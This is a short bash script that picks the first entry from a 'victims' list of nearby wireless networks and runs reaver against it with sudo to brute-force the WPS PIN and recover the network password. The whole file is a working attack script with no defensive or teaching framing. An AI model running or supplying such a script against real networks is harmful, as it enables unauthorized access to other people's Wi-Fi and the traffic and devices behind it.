#!/bin/bash
#
# Recover the password from the first network
#

INTERF=`cat system.csv |grep interface|tr "," "\n"|tail -1`

echo Starting reaver

BSSID=`cat victims_sorted.txt|sed 1d|head -1|awk '{print $1}'`
CHANNEL=`cat victims_sorted.txt|sed 1d|head -1|awk '{print $2}'`
ESSID=`cat victims_sorted.txt|sed 1d|head -1|awk '{print $6}'`

echo NETWORK SELECTED: $ESSID

sudo reaver -i $INTERF -c $CHANNEL -b $BSSID -e $ESSID -a -v -S -L
